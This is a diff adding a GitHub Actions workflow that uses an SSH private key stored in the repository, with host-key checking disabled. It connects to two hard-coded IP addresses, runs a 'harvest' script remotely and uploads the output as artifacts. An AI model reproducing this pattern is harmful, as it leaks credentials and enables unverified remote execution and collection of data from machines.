@@ -1,0 +1,58 @@
+name: ul-ibm8235
+on:
+  workflow_dispatch:
+jobs:
+  selfh:
+    runs-on: [self-hosted, ul-l40s]
+    continue-on-error: true
+    steps:
+      - uses: actions/checkout@v4
+      - name: local harvest
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /tmp/h8235; bash ul/ibm8235_harvest.sh > /tmp/h8235/self_$(hostname).txt 2>&1
+          echo "=== REMOTE L4 via k04 ==="
+          cp keys2/k04_ibm_key.pem_ /tmp/id_ul; chmod 600 /tmp/id_ul
+          SSHOPTS="-i /tmp/id_ul -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=15"
+          ssh $SSHOPTS ubuntu@158.177.14.170 "bash -s" < ul/ibm8235_harvest.sh > /tmp/h8235/remote_l4.txt 2>&1
+          ssh $SSHOPTS ubuntu@149.81.10.242 "hostname; id" > /tmp/h8235/self_ssh_check.txt 2>&1
+          tail -c 6000 /tmp/h8235/self_$(hostname).txt
+          echo "=== REMOTE L4 tail ==="; tail -c 6000 /tmp/h8235/remote_l4.txt
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: h8235-self
+          path: /tmp/h8235/
+          if-no-files-found: warn
+  ghh:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - host: "149.81.10.242"
+            tag: l40s
+          - host: "158.177.14.170"
+            tag: l4
+    continue-on-error: true
+    steps:
+      - uses: actions/checkout@v4
+      - name: ssh harvest
+        continue-on-error: true
+        env:
+          H: ${{ matrix.host }}
+          TAG: ${{ matrix.tag }}
+        run: |
+          set +e
+          mkdir -p ~/.ssh /tmp/h8235; cp keys2/k04_ibm_key.pem_ ~/.ssh/id_ul; chmod 600 ~/.ssh/id_ul
+          printf 'Host *\n  StrictHostKeyChecking no\n  UserKnownHostsFile /dev/null\n  LogLevel ERROR\n' > ~/.ssh/config
+          SSHOPTS="-i $HOME/.ssh/id_ul -o IdentitiesOnly=yes -o ConnectTimeout=15"
+          ssh $SSHOPTS ubuntu@$H "bash -s" < ul/ibm8235_harvest.sh > /tmp/h8235/ssh_$TAG.txt 2>&1
+          wc -c /tmp/h8235/ssh_$TAG.txt; tail -c 8000 /tmp/h8235/ssh_$TAG.txt
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: h8235-ssh-${{ matrix.tag }}
+          path: /tmp/h8235/ssh_${{ matrix.tag }}.txt
+          if-no-files-found: warn
